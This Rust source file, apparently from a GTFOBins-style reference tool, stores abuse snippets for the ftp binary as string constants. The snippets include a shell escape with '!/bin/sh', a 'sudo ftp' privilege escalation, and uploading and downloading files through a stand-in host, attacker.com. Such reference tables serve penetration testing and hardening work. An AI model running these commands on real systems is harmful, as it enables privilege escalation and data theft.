
pub static BIN_NAME: &'static str = "ftp";
pub static SH_CODE: &'static str = r#"
    
    ftp
    !/bin/sh
"#;
pub static FU_DESC: &'static str = "Send local file to a FTP server.";
pub static FU_CODE: &'static str = r#"
    
    RHOST=attacker.com
    ftp $RHOST
    put file_to_send
"#;
pub static FD_DESC: &'static str = "Fetch a remote file from a FTP server.";
pub static FD_CODE: &'static str = r#"
    
    RHOST=attacker.com
    ftp $RHOST
    get file_to_get
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo ftp
    !/bin/sh
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FU: Code<'static> = Code { 
	title: "FU_CODE",
	code: FU_CODE,
	tag: Tag::FU,
};
pub static FD: Code<'static> = Code { 
	title: "FD_CODE",
	code: FD_CODE,
	tag: Tag::FD,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
